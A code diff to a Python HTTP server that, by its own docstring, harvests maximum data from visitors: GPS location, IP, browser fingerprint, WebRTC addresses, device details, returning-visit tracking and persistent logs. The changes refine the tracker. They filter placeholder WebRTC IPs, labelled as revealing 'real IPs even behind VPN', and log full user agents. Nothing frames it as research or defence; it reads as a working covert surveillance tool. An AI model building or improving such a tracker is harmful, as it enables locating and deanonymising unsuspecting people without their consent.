@@ -5,7 +5,8 @@ Maximum data collection: GPS, IP, browser fingerprint, WebRTC, audio, fonts,
 device motion, network info, headers, session tracking, persistent logging.
 """
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import json, datetime, os, uuid
+import json, datetime, os, uuid, threading
+PRINT_LOCK = threading.Lock()
 
 PORT     = int(os.environ.get('PORT', 5000))
 LOG_FILE = "tracker_log.txt"
@@ -457,6 +458,7 @@ class Handler(BaseHTTPRequestHandler):
 
         try:
             data   = json.loads(raw)
+            PRINT_LOCK.acquire()
             ts     = datetime.datetime.now().strftime("%H:%M:%S")
             lat    = data.get("latitude")
             lng    = data.get("longitude")
@@ -517,7 +519,7 @@ class Handler(BaseHTTPRequestHandler):
             if srv_headers.get('Referer'): log(f"    REFERER    : {srv_headers.get('Referer')}")
 
             # ── WEBRTC ────────────────────────────────────────────────────────
-            webrtc_ips = fp.get('webrtcIPs', [])
+            webrtc_ips = [ip for ip in fp.get('webrtcIPs', []) if ip != '0.0.0.0']
             if webrtc_ips:
                 log(f"\n  {BOLD}{C}[ WEBRTC IP LEAK ]{RST}  {R}← real IPs even behind VPN!{RST}")
                 for wip in webrtc_ips:
@@ -529,7 +531,7 @@ class Handler(BaseHTTPRequestHandler):
             log(f"\n  {BOLD}{C}[ BROWSER FINGERPRINT ]{RST}")
             log(f"    SESSION ID : ...{str(sid)[-12:]}  {'[SEEN '+str(visit_count)+'x]' if is_returning else '[FIRST VISIT]'}")
             log(f"    PLATFORM   : {fp.get('platform')} / {fp.get('vendor','')}")
-            log(f"    USER AGENT : {str(fp.get('userAgent',''))[:75]}")
+            log(f"    USER AGENT : {fp.get('userAgent','')}")
             log(f"    SCREEN     : {fp.get('screenW')}×{fp.get('screenH')} @{fp.get('pixelRatio')}x  depth:{fp.get('screenDepth')}bit")
             log(f"    ORIENTATION: {fp.get('orientation')}")
             log(f"    LANGUAGE   : {fp.get('language')}  ({fp.get('languages','')})")
@@ -577,6 +579,9 @@ class Handler(BaseHTTPRequestHandler):
         except Exception as e:
             print(f"{R}[ERROR] {e}{RST}")
             import traceback; traceback.print_exc()
+        finally:
+            try: PRINT_LOCK.release()
+            except: pass
 
         self.send_response(200)
         self.send_header("Access-Control-Allow-Origin", "*")
